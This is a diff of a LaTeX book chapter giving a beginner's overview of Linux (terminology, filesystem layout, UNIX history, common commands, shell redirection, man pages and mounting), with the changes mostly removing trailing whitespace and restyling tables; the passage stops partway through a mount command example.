@@ -1,35 +1,35 @@
 \chapter{Additional Useful Information}
 	\label{ch:GeneralKnowledge}
-	This is the final chapter of this book. 
-	It is where the additional background information that I decided was worth while adding, but couldn't find a place that it neatly fit into was placed. 
-	Due to this, each section discusses a new topic, much like the previous chapters have done. 
-	However, this does not make the content within any less important. 
-	Though none of this content on it's own is deserving of a chapter (with the possible exception of Linux), 
-	it can be powerful in determining how to attack a problem, or simply by providing context which would not have otherwise been available. 
-	Furthermore, much of the content explains how major parts of the field work. 
+	This is the final chapter of this book.
+	It is where the additional background information that I decided was worth while adding, but couldn't find a place that it neatly fit into was placed.
+	Due to this, each section discusses a new topic, much like the previous chapters have done.
+	However, this does not make the content within any less important.
+	Though none of this content on it's own is deserving of a chapter (with the possible exception of Linux),
+	it can be powerful in determining how to attack a problem, or simply by providing context which would not have otherwise been available.
+	Furthermore, much of the content explains how major parts of the field work.
 	\section{Linux}
-		This section will be a general overview of the Linux world. 
-		It will go through the terminology, history, reasoning and other issues that people new to the OS face\cite{LinuxIntro}. 
+		This section will be a general overview of the Linux world.
+		It will go through the terminology, history, reasoning and other issues that people new to the OS face\cite{LinuxIntro}.
 		\subsection{Terminology}
 			Below is a far from exhaustive list of terminology used within the Linux world:
 			\begin{description}
-				\item[Linux] The kernel that underpins the OS that is often referred to as Linux. 
+				\item[Linux] The kernel that underpins the OS that is often referred to as Linux.
 				\item[GNU] An organisation that maintain a tool set which runs on Linux (and will run on any Unix, soon windows)
-				\item[GPL] A licensing system that requires that changes be retransmitted back to the rest of the world. 
+				\item[GPL] A licensing system that requires that changes be retransmitted back to the rest of the world.
 				\item[Terminal] The command line access to a Linux computer.
-				\item[Root] Either the base user or base directory. 
-					In the former case, this is the user that has absolute power over the OS. 
-					In the latter case, this is the first directory of the system. 
-				\item[Filesystem] The system that file storage works on\footnote{\href{http://linux.die.net/man/7/hier}{man 7 hier}}: 
+				\item[Root] Either the base user or base directory.
+					In the former case, this is the user that has absolute power over the OS.
+					In the latter case, this is the first directory of the system.
+				\item[Filesystem] The system that file storage works on\footnote{\href{http://linux.die.net/man/7/hier}{man 7 hier}}:
 				\begin{description}
-					\item[/etc] The configuration directory. 
-						This houses all system configuration as well as specific program configurations. 
-						This serves much the same purpose as the windows registry, but in a far better format. 
-					\item[/boot] The boot configuration of the system. 
-						Should only contain the minimum necessary to boot the system. 
-						On an MBR system, the bootloader configuration will be here. 
+					\item[/etc] The configuration directory.
+						This houses all system configuration as well as specific program configurations.
+						This serves much the same purpose as the windows registry, but in a far better format.
+					\item[/boot] The boot configuration of the system.
+						Should only contain the minimum necessary to boot the system.
+						On an MBR system, the bootloader configuration will be here.
 						On an EFI system, the EFI boot manager will be mounted at /boot/efi
-					\item[/dev] A virtual filesystem which gives the OS pointers to certain devices\footnote{\href{http://linux.die.net/man/1/mknod}{man 1 mknod}}. 
+					\item[/dev] A virtual filesystem which gives the OS pointers to certain devices\footnote{\href{http://linux.die.net/man/1/mknod}{man 1 mknod}}.
 						\begin{itemize}
 							\item Storage devices
 							\item CPUs
@@ -41,239 +41,247 @@
 							\item random (Used for getting random numbers at the shell)
 							\item input
 						\end{itemize}
-					\item[/bin] The binaries used for basic user interaction. 
+					\item[/bin] The binaries used for basic user interaction.
 					\item[/sbin] /bin, but for system binaries, usually not used by normal users.
 					\item[/home] Stores user home directories (which then store documents, photos, etc)
-					\item[/lib] System libraries which are used for running dynamically linked programs. 
-						These are the minimum required to boot and run the system. 
-					\item[/media or /mnt] Used for mounting drives to. 
+					\item[/lib] System libraries which are used for running dynamically linked programs.
+						These are the minimum required to boot and run the system.
+					\item[/media or /mnt] Used for mounting drives to.
 					\item[/opt] Optional or extra packages from outside the systems package manager
 					\item[/proc] Process information. Can be a good place to find information that shouldn't have been leaked\footnote{\href{http://linux.die.net/man/5/proc}{man 5 proc}}.
-					\item[/root] The root user's home directory. 
-					\item[/run] Files that support the current running of the system. Usually temporary. 
-					\item[/srv] Server files. Some systems use this for web or other services rather than ``/var''. 
-					\item[/sys] Similar to ``/proc'' but kernel only and better secured. 
+					\item[/root] The root user's home directory.
+					\item[/run] Files that support the current running of the system. Usually temporary.
+					\item[/srv] Server files. Some systems use this for web or other services rather than ``/var''.
+					\item[/sys] Similar to ``/proc'' but kernel only and better secured.
 					\item[/tmp] Temporary files which may be deleted at any time (such as booting or a regular job).
-					\item[/usr] Data that can be shared between systems, generally minor program specific config and libraries. 
-					\item[/var] Items that can change in size, such as logs and caches. 
+					\item[/usr] Data that can be shared between systems, generally minor program specific config and libraries.
+					\item[/var] Items that can change in size, such as logs and caches.
 				\end{description}
-				\item[CLI] Command Line Interface, also referred to as a \textbf{shell}. 
-					This is the system used to interact with the computer using typed commands, rather than selecting the item that you wish to interact with graphically. 
-				\item[GUI] Graphical User Interface, the opposite of CLI. 
-					This is the interface that you see and select graphically what you want to do. 
-					However, it is far more limiting than the CLI as you cannot string ideas and programs together in infinite ways. 
-					It is just simpler to learn and understand. 
-				\item[Distro] A distribution. Someone's (usually an organisation's) version of Linux and the configuration and tools that make it a useful operating system. 
-					Examples include Debian, Arch, Gentoo and Kali. 
-				\item[Kernel] The core of an operating system. 
-					This program interacts with the hardware of the system, creating an abstraction layer that other software can interact with. 
-				\item[Open Source] This is the notation that the source code of a program is available freely. 
-					This means that people can read it, adapt it to their needs and then re-introduce it into the world. 
+				\item[CLI] Command Line Interface, also referred to as a \textbf{shell}.
+					This is the system used to interact with the computer using typed commands, rather than selecting the item that you wish to interact with graphically.
+				\item[GUI] Graphical User Interface, the opposite of CLI.
+					This is the interface that you see and select graphically what you want to do.
+					However, it is far more limiting than the CLI as you cannot string ideas and programs together in infinite ways.
+					It is just simpler to learn and understand.
+				\item[Distro] A distribution. Someone's (usually an organisation's) version of Linux and the configuration and tools that make it a useful operating system.
+					Examples include Debian, Arch, Gentoo and Kali.
+				\item[Kernel] The core of an operating system.
+					This program interacts with the hardware of the system, creating an abstraction layer that other software can interact with.
+				\item[Open Source] This is the notation that the source code of a program is available freely.
+					This means that people can read it, adapt it to their needs and then re-introduce it into the world.
 					It has been the main driver for Linux adoption.
-				\item[Free Software] This is a movement similar to open source, but more vehement in their stance. 
-					All software must be free (as in the code freely available) for reasons of security, progress and ideology. 
+				\item[Free Software] This is a movement similar to open source, but more vehement in their stance.
+					All software must be free (as in the code freely available) for reasons of security, progress and ideology.
 					This is mainly pushed by the GNU movement and the Free Software Foundation.
-				\item[Run Level] This is the level to which the system boots. 
-					These can also be known as targets on newer systems. 
-					They can be single user, multi-user, CLI only or graphical. 
-				\item[Access Control] The standard means of specifying who can access what on a Linux system. 
-					Generally, this is done using discretionary access control. 
-					However, some systems such as Grsecurity and SELinux use Mandatory access control, which is an external enforcer on who can access files on the system. 
+				\item[Run Level] This is the level to which the system boots.
+					These can also be known as targets on newer systems.
+					They can be single user, multi-user, CLI only or graphical.
+				\item[Access Control] The standard means of specifying who can access what on a Linux system.
+					Generally, this is done using discretionary access control.
+					However, some systems such as Grsecurity and SELinux use Mandatory access control, which is an external enforcer on who can access files on the system.
 			\end{description}
 		\subsection{History}
-			The history of Linux is an interesting one with deep roots in early computer science and operating systems. 
-			To understand why Linux was built the way it is, you must first understand UNIX and some of the computer designs that were common at the time. 
+			The history of Linux is an interesting one with deep roots in early computer science and operating systems.
+			To understand why Linux was built the way it is, you must first understand UNIX and some of the computer designs that were common at the time.
 			\subsubsection{UNIX}
 			\index{UNIX}
-				No section on Linux would be complete without least a small section on UNIX. 
-				At the time, before the late 60's and early 70's, computers were exceptionally expensive and large. 
-				Furthermore, most of them had software specific to that computer, running on a processor architecture that no other type of machine used. 
-				Thus, software written for one system would almost never work on another, 
-				and the skills gained on one would be useless on another. 
+				No section on Linux would be complete without least a small section on UNIX.
+				At the time, before the late 60's and early 70's, computers were exceptionally expensive and large.
+				Furthermore, most of them had software specific to that computer, running on a processor architecture that no other type of machine used.
+				Thus, software written for one system would almost never work on another,
+				and the skills gained on one would be useless on another.
 
-				Until this time, these issues were the only paradigm for computing. 
-				However, in 1969, a team at AT\&T Bell Labs began working on a solution to the problem. 
+				Until this time, these issues were the only paradigm for computing.
+				However, in 1969, a team at AT\&T Bell Labs began working on a solution to the problem.
 				There system---which became UNIX---was designed to be:
 				\begin{itemize}
 					\item Simple and Elegant
-					\item Written in the more portable C language, rather than the Assembly that was common at the time. 
-					\item Able to recycle code. 
+					\item Written in the more portable C language, rather than the Assembly that was common at the time.
+					\item Able to recycle code.
 				\end{itemize}
-				The idea of code recycling was the important part of UNIX. 
-				Until this time, all operating systems were built using a language and environment specific to that machine. 
-				UNIX however, had only one small part which needed to be specific: the Kernel. 
-				This piece of code was built to interact with the hardware and allow other software to interact with it. 
-				Thus, no matter what hardware the Kernel was running on, the software could be made work. 
+				The idea of code recycling was the important part of UNIX.
+				Until this time, all operating systems were built using a language and environment specific to that machine.
+				UNIX however, had only one small part which needed to be specific: the Kernel.
+				This piece of code was built to interact with the hardware and allow other software to interact with it.
+				Thus, no matter what hardware the Kernel was running on, the software could be made work.
 
-				This idea of multiple computers from different vendors running the same OS led to a number of ``weird'' situations. 
-				Computers from different vendors could communicate over a network, 
-				software vendors could sell for multiple computer vendors with little extra work. 
-				Finally, people could be educated on one system and use most of them. 
+				This idea of multiple computers from different vendors running the same OS led to a number of ``weird'' situations.
+				Computers from different vendors could communicate over a network,
+				software vendors could sell for multiple computer vendors with little extra work.
+				Finally, people could be educated on one system and use most of them.
 
-				Sadly, at the time, computers that could run UNIX were expensive and large. 
-				Thus, when the home computer (or micro-computer) revolution happened, these computers were left out of UNIX. 
-				This led to many people running MS-DOS (or another DOS) or early versions of Windows. 
-				This is a situation that has not changed to date. 
-				However, progress is being made. 
+				Sadly, at the time, computers that could run UNIX were expensive and large.
+				Thus, when the home computer (or micro-computer) revolution happened, these computers were left out of UNIX.
+				This led to many people running MS-DOS (or another DOS) or early versions of Windows.
+				This is a situation that has not changed to date.
+				However, progress is being made.
 
 			\subsection{Building Linux}
 			\index{Linux}
-				While UNIX itself was proprietary code, the concepts and standards that it created were open to anyone. 
-				Thus, when in the 90s, home PCs became powerful enough to run full UNIX systems, 
-				Linux Torvalds, a computer science student, started writing the code required for it. 
+				While UNIX itself was proprietary code, the concepts and standards that it created were open to anyone.
+				Thus, when in the 90s, home PCs became powerful enough to run full UNIX systems,
+				Linux Torvalds, a computer science student, started writing the code required for it.
 
 				\index{POSIX}
-				From the outset, the goal of this system was to create a fully POSIX (the standard for UNIX) compliant OS for academic use. 
-				This led to a system that was free to use with the code available to edit and that was completely UNIX compliant. 
-				Thus, people came in droves. 
-				They were looking for a system similar to what they had in universities, or at work and Linux provided it. 
-				However, the hardware for a home PC was vastly different and more varied than that of a mainframe from the 1970s. 
-				It was this difference that could have been the downfall of Linux. 
-				But with Linus' decision to leave the code open, many people wrote their own drivers for it, allowing sound, graphics and general system use to work on some of the most obscure hardware around. 
+				From the outset, the goal of this system was to create a fully POSIX (the standard for UNIX) compliant OS for academic use.
+				This led to a system that was free to use with the code available to edit and that was completely UNIX compliant.
+				Thus, people came in droves.
+				They were looking for a system similar to what they had in universities, or at work and Linux provided it.
+				However, the hardware for a home PC was vastly different and more varied than that of a mainframe from the 1970s.
+				It was this difference that could have been the downfall of Linux.
+				But with Linus' decision to leave the code open, many people wrote their own drivers for it, allowing sound, graphics and general system use to work on some of the most obscure hardware around.
 
-				Within two years, the project had grown to 12000 users. 
+				Within two years, the project had grown to 12000 users.
 				It continued to grow and stay within the POSIX standard, slowly adding the whole feature set of UNIX.
-				This had made it a huge player in the server arena of computing. 
-				However, it has still not taken over the desktop computing environment, though that was its original goal. 
+				This had made it a huge player in the server arena of computing.
+				However, it has still not taken over the desktop computing environment, though that was its original goal.
 
-				While back in these early times, it was necessary to know how Linux worked and some systems programming to get it to run, modern Linux systems require none of this. 
-				Originally, one had to be able to read and understand manual pages for systems that would not work when first installing Linux. 
+				While back in these early times, it was necessary to know how Linux worked and some systems programming to get it to run, modern Linux systems require none of this.
+				Originally, one had to be able to read and understand manual pages for systems that would not work when first installing Linux.
 				\index{Distribution}
-				These systems, such as the X11 display driver could often be hard to set up, 
-				in some cases, they could physically burn the hardware you were running on. 
-				In the modern Linux world, however, distros such as Debian and Linux Mint do all of this for you. 
-				This is not to say that you cannot learn the system, distros such as Gentoo and Linux From Scratch will give you that opportunity. 
+				These systems, such as the X11 display driver could often be hard to set up,
+				in some cases, they could physically burn the hardware you were running on.
+				In the modern Linux world, however, distros such as Debian and Linux Mint do all of this for you.
+				This is not to say that you cannot learn the system, distros such as Gentoo and Linux From Scratch will give you that opportunity.
 
 
 		\subsection{Linux Commands}
-			Linux commands are the basis for interacting with the system. 
-			One can think of them as a way to speak to the computer without going through the interpreter that is the GUI. 
-			The difference between these two is that the GUI was made to make simple things easy, the CLI makes complex things possible. 
-			Thus, using the CLI to ``speak'' to the computer allows you to interact with the system. 
+			Linux commands are the basis for interacting with the system.
+			One can think of them as a way to speak to the computer without going through the interpreter that is the GUI.
+			The difference between these two is that the GUI was made to make simple things easy, the CLI makes complex things possible.
+			Thus, using the CLI to ``speak'' to the computer allows you to interact with the system.
 
-			The CLI can be broken down into parts. 
-			Each of these parts has a name and properties, as seen in table \ref{tab:CLIParts}. 
+			The CLI can be broken down into parts.
+			Each of these parts has a name and properties, as seen in table \ref{tab:CLIParts}.
 			\begin{table}[H]
 				\centering
 			%	\begin{adjustbox}{max width=1\textwidth}
-				\begin{tabular}{| p{2.5cm} | p{3cm} | p{3cm} | p{3cm} |}
+				\begin{tabular}{| p{2.5cm}| p{3cm}| p{3cm}| p{3cm}|}
 					\hline
 					\multicolumn{1}{|c|}{\multirow{2}{*}{\textbf{Command}}} & \multicolumn{2}{| c |}{\textbf{Arguments}}  & \multicolumn{1}{|c|}{\multirow{2}{*}{\textbf{Other}}}
 					\\ \cline{2-3}
 					& \multicolumn{1}{|c|}{\textbf{Flags}} & \multicolumn{1}{|c|}{\textbf{Data}} & \\ \hline
-					The name or location of the command to run & 
-					Switches that change the way the program will work & 
+					The name or location of the command to run &
+					Switches that change the way the program will work &
 					Data which the program operates on. This can be dispersed within multiple flags &
-					Other content such as pipes and redirection. 
+					Other content such as pipes and redirection.
 					Any commands passed here follow the same format \\ \hline
 				\end{tabular}
 			%\end{adjustbox}
 				\label{tab:CLIParts}
 				\caption{Parts of a CLI Command}
-			\end{table} 
+			\end{table}
 
-			Further to this, understanding how the shell that you are using works can make using it far more efficient. 
-			Table \ref{tab:BashKeyShortcuts} explains the keyboard shortcuts and commands available in the default bash shell. 
+			Further to this, understanding how the shell that you are using works can make using it far more efficient.
+			Table \ref{tab:BashKeyShortcuts} explains the keyboard shortcuts and commands available in the default bash shell.
 			%TODO: This is linking to the wrong table
 			\begin{table}[H]
 				\centering
 				\begin{adjustbox}{max width=1\textwidth}
-				\begin{tabular}{| p{3cm} | p{7cm} |} 
-					\hline
-					\textbf{Key \mbox{Combination}} & \textbf{Function} \\ \hline
-					\keys{\ctrl + A} & Move cursor to the beginning of the line. \\ \hline
-					\keys{\ctrl + C} & End a running program and return to the prompt. \\ \hline
-					\keys{\ctrl + D} & Log out of the current shell session, equal to typing ``exit'' or ``logout''. \\ \hline
-					\keys{\ctrl + E} & Move the cursor to the end of the line. \\ \hline
-					\keys{\ctrl + H} & Generate a backspace character. \\ \hline
-					\keys{\ctrl + L} & Clear the terminal. Equivalent to typing ``clear''. \\ \hline
-					\keys{\ctrl + R} & Search command history. \\ \hline
-					\keys{\ctrl + Z} & Suspend a program. \\ \hline
-					\keys{\arrowkeyright} or \keys{\arrowkeyleft} & Move the cursor one place on the current line. \\ \hline
-					\keys{\arrowkeyup} or \keys{\arrowkeydown} & Browse command history. \\ \hline
-					\keys{\shift + Page Up} or \keys{\shift + Page Down} & Browse terminal buffer (See text that has been scrolled off screen. 
-					\\ \hline
-					\keys{\tab} & Command or Filename completion. If multiple options exist the system will prompt for a choice. \\ \hline
-					\keys{\tab + \tab} & Show options for completion. \\ \hline
+				\begin{tabular}{p{3cm}p{7cm}}
+					\toprule
+					\textbf{Key \mbox{Combination}} & \textbf{Function} \\
+					\toprule
+					\keys{\ctrl + A} & Move cursor to the beginning of the line. \\
+					\keys{\ctrl + C} & End a running program and return to the prompt. \\
+					\keys{\ctrl + D} & Log out of the current shell session, equal to typing ``exit'' or ``logout''. \\
+					\keys{\ctrl + E} & Move the cursor to the end of the line. \\
+					\keys{\ctrl + H} & Generate a backspace character. \\
+					\keys{\ctrl + L} & Clear the terminal. Equivalent to typing ``clear''. \\
+					\keys{\ctrl + R} & Search command history. \\
+					\keys{\ctrl + Z} & Suspend a program. \\
+					\keys{\arrowkeyright} or \keys{\arrowkeyleft} & Move the cursor one place on the current line. \\
+					\keys{\arrowkeyup} or \keys{\arrowkeydown} & Browse command history. \\
+					\keys{\shift + Page Up} or \keys{\shift + Page Down} & Browse terminal buffer (See text that has been scrolled off screen.
+					\\
+					\keys{\tab} & Command or Filename completion. If multiple options exist the system will prompt for a choice. \\
+					\keys{\tab + \tab} & Show options for completion. \\
+					\bottomrule
 				\end{tabular}
 			\end{adjustbox}
 				\label{tab:BashKeyShortcuts}
 				\caption{Keyboard Shortcuts for the Bourne Again Shell}
 			\end{table}
 
-			Commands are also altered by a set of variables called the environment. 
-			These variables are inherited from the calling program, and can give instructions as to where to find things or how to act. 
-			For example, when you load up your favorite shell, it reads from the ``PATH'' variable to determine where to find programs to run. 
-			You can see the values of these variables by running the command ``echo \$<name>'' at the prompt. 
-			They can either be set in your ``.bashrc'' equivalent, or by using the command ``export''. 
+			Commands are also altered by a set of variables called the environment.
+			These variables are inherited from the calling program, and can give instructions as to where to find things or how to act.
+			For example, when you load up your favorite shell, it reads from the ``PATH'' variable to determine where to find programs to run.
+			You can see the values of these variables by running the command ``echo \$<name>'' at the prompt.
+			They can either be set in your ``.bashrc'' equivalent, or by using the command ``export''.
 
 			A summary of the most common Linux command can be found in table \ref{tab:LinuxCommandsSummary}.
 			\index{Command Reference}
 			\begin{center}
-				\begin{longtable}{| l | p{6cm} |}
-					\hline
-					\textbf{Command} & \textbf{Use} \\ \hline
+				\begin{longtable}{lp{6cm}}
+					\toprule
+					\textbf{Command} & \textbf{Use} \\
+					\toprule
 					\endhead
-					\multicolumn{2}{|r|}{{Continued on next page}} \\ \hline
+					\midrule
+					\multicolumn{2}{r}{{Continued on next page}} \\
+					\bottomrule
 					\endfoot
+					\bottomrule
 					\endlastfoot
-					cat & Send the content of a file to STDOUT. 
-							Multiple files will be appended to each other. \\ \hline
-					cd <directory> & Enter directory \\ \hline
-					chgrp & Change the group ownership of a file. \\ \hline
-					chmod <mode> <file> & Change permissions of files to <mode>. \\ \hline
-					chown <owner>[:<group>] <file> & Change owner or group owner of file. \\ \hline
-					cp <src> <dest> & Copy src to dest. \\ \hline
-					df & Reports disk usage. \\ \hline
-					echo <string> & Print string to STDOUT. \\ \hline
-					export & A bash internal that adds to environmental variables. \\ \hline
-					file & Determine the type of a file. \\ \hline
-					find <path> <expression> & find files within the file system. \\ \hline
-					grep <pattern> [file] & Print only lines which match pattern. 
-											If file given, search it, otherwise search STDIN \\ \hline 
-					head <file> & Print the top of file. \\ \hline
-					id & Prints real and effective user names and IDs. \\ \hline 
-					info <command> & Basic documentation about a command. \\ \hline
-					less [file] & View a file or STDIN with a pager. \\ \hline
-					ln <target> <name> & create a link to target named name. 
-										use ``-s'' for simlink. \\ \hline 
-					locate <string> & Search the file database for string. \\ \hline
-					ls & Prints directory content. \\ \hline 
-					man <command> & Use the system pager to read the manual for command. \\ \hline
-					mkdir <name> & Make a new directory named name. \\ \hline
-					mv <src> <dest> & Move src to dest. \\ \hline
-					newgrp <name> & Log into a new group. \\ \hline
-					pwd & Print the current working directory. \\ \hline 
-					quota & Show disk usage and limits. \\ \hline
-					rm <file> & Delete files or directories. 
-								Directories are deleted with the ``-r flag''. \\ \hline
-					tail [file] & Print the end of file or STDIN. \\ \hline
-					umask & show or change new file creation permission mode. \\ \hline
-					wc [file] & Counts lines, words and characters in file or STDIN. \\ \hline
-					which <command> & shows the full path to command. \\ \hline
+					cat & Send the content of a file to STDOUT.
+							Multiple files will be appended to each other. \\
+					cd <directory> & Enter directory \\
+					chgrp & Change the group ownership of a file. \\
+					chmod <mode> <file> & Change permissions of files to <mode>. \\
+					chown <owner>[:<group>] <file> & Change owner or group owner of file. \\
+					cp <src> <dest> & Copy src to dest. \\
+					df & Reports disk usage. \\
+					echo <string> & Print string to STDOUT. \\
+					export & A bash internal that adds to environmental variables. \\
+					file & Determine the type of a file. \\
+					find <path> <expression> & find files within the file system. \\
+					grep <pattern> [file] & Print only lines which match pattern.
+											If file given, search it, otherwise search STDIN \\
+					head <file> & Print the top of file. \\
+					id & Prints real and effective user names and IDs. \\
+					info <command> & Basic documentation about a command. \\
+					less [file] & View a file or STDIN with a pager. \\
+					ln <target> <name> & create a link to target named name.
+										use ``-s'' for simlink. \\
+					locate <string> & Search the file database for string. \\
+					ls & Prints directory content. \\
+					man <command> & Use the system pager to read the manual for command. \\
+					mkdir <name> & Make a new directory named name. \\
+					mv <src> <dest> & Move src to dest. \\
+					newgrp <name> & Log into a new group. \\
+					pwd & Print the current working directory. \\
+					quota & Show disk usage and limits. \\
+					rm <file> & Delete files or directories.
+								Directories are deleted with the ``-r flag''. \\
+					tail [file] & Print the end of file or STDIN. \\
+					umask & show or change new file creation permission mode. \\
+					wc [file] & Counts lines, words and characters in file or STDIN. \\
+					which <command> & shows the full path to command. \\
 					\noalign{\vskip 0.5cm}
 					\caption{\label{tab:LinuxCommandsSummary}Basic Command Reference for Linux}
 					\vspace{-1.3cm}
 				\end{longtable}
 			\end{center}
 
-			Further to this, there are a number of special characters which can give powerful actions. 
-			Table \ref{tab:SpecialCommands} shows the special characters that can be used on the bash commandline. 
+			Further to this, there are a number of special characters which can give powerful actions.
+			Table \ref{tab:SpecialCommands} shows the special characters that can be used on the bash commandline.
 			\begin{table}[H]
 				\centering
 				\begin{adjustbox}{max width=1\textwidth}
-				\begin{tabular}{| l | p{7cm} |}
-					\hline
-					\textbf{Character} & \textbf{Use} \\ \hline
-					\$(<command>) & Run command and replace the block with it's output. \\ \hline
-					\verb+`+<command>\verb+`+  & As for \$ \\ \hline
-					<command1> | <command2> & Send STDOUT of command1 to STDIN. \\ \hline
-					<command> > <file> & Send STDOUT of command to file. \\ \hline
-					<command> < <file> & Send file to command as STDIN. \\ \hline
-					<command> \(>>\) <file> & Append STDOUT to file. \\ \hline
-					<command> 2> <file> & Send STDERR to file, works with ``\(>>\)'' as well. \\ \hline
-					<command> \&> file & Send STDERR and STDOUT to file. Also works with ``\(>>\)''. \\ \hline
-					<command> >\&x & Send STDOUT to file descriptor x. Any file descriptor can be used before ``>''. \\ \hline
+				\begin{tabular}{lp{7cm}}
+					\toprule
+					\textbf{Character} & \textbf{Use} \\
+					\bottomrule
+					\$(<command>) & Run command and replace the block with it's output. \\
+					\verb+`+<command>\verb+`+  & As for \$ \\
+					<command1> | <command2> & Send STDOUT of command1 to STDIN. \\
+					<command> > <file> & Send STDOUT of command to file. \\
+					<command> < <file> & Send file to command as STDIN. \\
+					<command> \(>>\) <file> & Append STDOUT to file. \\
+					<command> 2> <file> & Send STDERR to file, works with ``\(>>\)'' as well. \\
+					<command> \&> file & Send STDERR and STDOUT to file. Also works with ``\(>>\)''. \\
+					<command> >\&x & Send STDOUT to file descriptor x. Any file descriptor can be used before ``>''. \\
+					\bottomrule
 				\end{tabular}
 			\end{adjustbox}
 				\label{tab:SpecialCommands}
@@ -283,12 +291,12 @@
 			\FloatBarrier
 		\subsection{Man Pages}
 		\index{Manual Pages}
-			The information found here is simply an introduction. 
-			It is a small subsection of the information that exists on Linux and its systems. 
-			Most of this information can be found in its most raw technical form in the Linux man pages. 
+			The information found here is simply an introduction.
+			It is a small subsection of the information that exists on Linux and its systems.
+			Most of this information can be found in its most raw technical form in the Linux man pages.
 
-			These documents are the basis for working with Linux programming, as well as programming on Linux. 
-			It is broken down into chapters---each having an overarching topic---then further broken into commands or functions. 
+			These documents are the basis for working with Linux programming, as well as programming on Linux.
+			It is broken down into chapters---each having an overarching topic---then further broken into commands or functions.
 			A condensed table of contents for man pages is below:
 			\begin{enumerate}
 				\item User Commands
@@ -303,158 +311,163 @@
 				\item[N.] TCL Functions
 			\end{enumerate}
 
-			The individual pages within these documents are also broken into standard sections. 
+			The individual pages within these documents are also broken into standard sections.
 			These sections are:
 			\begin{enumerate}
 				\item Name of the command and ID of section.
-				\item Name of command and a short description. 
-					This description is seachable using the ``apropos'' command. 
-				\item Synopsis of the command with full technical notation. 
-					Generally this will give all basic options. 
+				\item Name of command and a short description.
+					This description is seachable using the ``apropos'' command.
+				\item Synopsis of the command with full technical notation.
+					Generally this will give all basic options.
 					Optional arguments are within [ ] brackets.
 				\item A longer Description
-				\item Options with descriptions listed. 
-				\item Environmental Variables that effect the command or function. 
-				\item Command or function specific sections. 
-				\item See Also references to other man pages. 
-				\item Author of the given page. 
-				\item Known bugs. 
+				\item Options with descriptions listed.
+				\item Environmental Variables that effect the command or function.
+				\item Command or function specific sections.
+				\item See Also references to other man pages.
+				\item Author of the given page.
+				\item Known bugs.
 			\end{enumerate}
 
-			These pages can be navigated in the same way as the system pager, which on most modern systems is less. 
-			For simpler descriptions, the ``info'' command works in a similar way. 
+			These pages can be navigated in the same way as the system pager, which on most modern systems is less.
+			For simpler descriptions, the ``info'' command works in a similar way.
 
 		\subsection{File Systems}
-			On Linux, everything is a file. 
-			If it's not a file, it's a process, and there is a file for that too. 
+			On Linux, everything is a file.
+			If it's not a file, it's a process, and there is a file for that too.
 
-			Thus, on Linux, understanding the file system is one of the most useful parts of understanding the system. 
-			This is because many files that are available in Linux are more than just files. 
-			There are a number of different items which look and act like files, but allow you to do more complex things. 
+			Thus, on Linux, understanding the file system is one of the most useful parts of understanding the system.
+			This is because many files that are available in Linux are more than just files.
+			There are a number of different items which look and act like files, but allow you to do more complex things.
 
-			\subsubsection{Types of Files} 
-				The common files that you have been working with are generally termed ``regular files''. 
+			\subsubsection{Types of Files}
+				The common files that you have been working with are generally termed ``regular files''.
 				Other files that you will come across are:
 				\begin{description}
 					\item[Directories] Files that list other files within them.
-						Listed as ``d'' in file permissions. 
-					\item[Special Files] Files used for IO. Most are stored within ``/dev''. 
-						See the terminology section for more information. 
+						Listed as ``d'' in file permissions.
+					\item[Special Files] Files used for IO. Most are stored within ``/dev''.
+						See the terminology section for more information.
 						Listed as ``c'' in file permissions.
-					\item[Links] Files that make the same file visible in more than one part of the directory structure. 
-						Listed as ``l'' in file permissions. 
-					\item[Sockets] Similar to TCP/IP sockets. 
-						These allow inter-process networking under the filesystems access control. 
+					\item[Links] Files that make the same file visible in more than one part of the directory structure.
+						Listed as ``l'' in file permissions.
+					\item[Sockets] Similar to TCP/IP sockets.
+						These allow inter-process networking under the filesystems access control.
 						Listed as ``s'' in file permissions.
-					\item[Named Pipes] Similar to sockets, but simpler to use without explicitly programming for them. 
-						Listed as ``p'' in file permissions. 
+					\item[Named Pipes] Similar to sockets, but simpler to use without explicitly programming for them.
+						Listed as ``p'' in file permissions.
 				\end{description}
 
 
 			\subsubsection{Mounting}
 			\index{Mounting}
-				Linux filesystems are usually broken down into partitions. 
-				These partitions are used to allocate a given amount of space to a given part of the OS. 
-				However, they also have a number of security purposes, as well as simple data loss prevention. 
+				Linux filesystems are usually broken down into partitions.
+				These partitions are used to allocate a given amount of space to a given part of the OS.
+				However, they also have a number of security purposes, as well as simple data loss prevention.
 
-				To see the filesystems on your computer, the commands ``lsblk'' or ``df -h'' will show what systems are available, where they are mounted and what storage is available on them. 
-				Without any user interaction, this will be the same as the contents of the filesystem table found at ``/etc/fstab''. 
-				An example of the content of one of these files can be found in table \ref{tab:fstab}. 
-				The contents of this table, when formatted correctly and placed on the correct system will work. 
+				To see the filesystems on your computer, the commands ``lsblk'' or ``df -h'' will show what systems are available, where they are mounted and what storage is available on them.
+				Without any user interaction, this will be the same as the contents of the filesystem table found at ``/etc/fstab''.
+				An example of the content of one of these files can be found in table \ref{tab:fstab}.
+				The contents of this table, when formatted correctly and placed on the correct system will work.
 				\begin{table}[htb]
 					\centering
 				\begin{adjustbox}{max width=1\textwidth}
-					\begin{tabular}{| l | l | l | l | l | l |}
-						\hline
-						\textbf{File System} & \textbf{Directory} & \textbf{Type} & \textbf{options} & \textbf{dump} & \textbf{pass} \\ \hline
-						/dev/sda1 & / & btrfs & rw,noatime & 0 & 0 \\ \hline
-						%UUID=aeb6cbbf-f40c-4659-9d81-605e84467349 & / & btrfs & rw,relatime & 0 & 0 \\ \hline
-						/media/store & /srv/nfs4/store & none & bind & 0 & 0 \\ \hline
+					\begin{tabular}{l l l l l l }
+						\toprule
+						\textbf{File System} & \textbf{Directory} & \textbf{Type} & \textbf{options} & \textbf{dump} & \textbf{pass} \\
+						\toprule
+						/dev/sda1 & / & btrfs & rw,noatime & 0 & 0 \\
+						%UUID=aeb6cbbf-f40c-4659-9d81-605e84467349 & / & btrfs & rw,relatime & 0 & 0 \\
+						/media/store & /srv/nfs4/store & none & bind & 0 & 0 \\
+						\bottomrule
 					\end{tabular}
 				\end{adjustbox}
 					\label{tab:fstab}
 					\caption{A standard Linux fstab}
 				\end{table}
-				The filesystems stated in table \ref{tab:fstab} will mount automatically at boot, or when the command ``mount <file system>'' is given. 
+				The filesystems stated in table \ref{tab:fstab} will mount automatically at boot, or when the command ``mount <file system>'' is given.
 				However, to mount filesystems that are not constant within the system, you must use the mount\footnote{\href{http://linux.die.net/man/8/mount}{man 8 mount}} command specifically.
 				\begin{lstlisting}[style=CLI]
-					# mount -o <option>,<option> -t <type> <file system> <directory> 
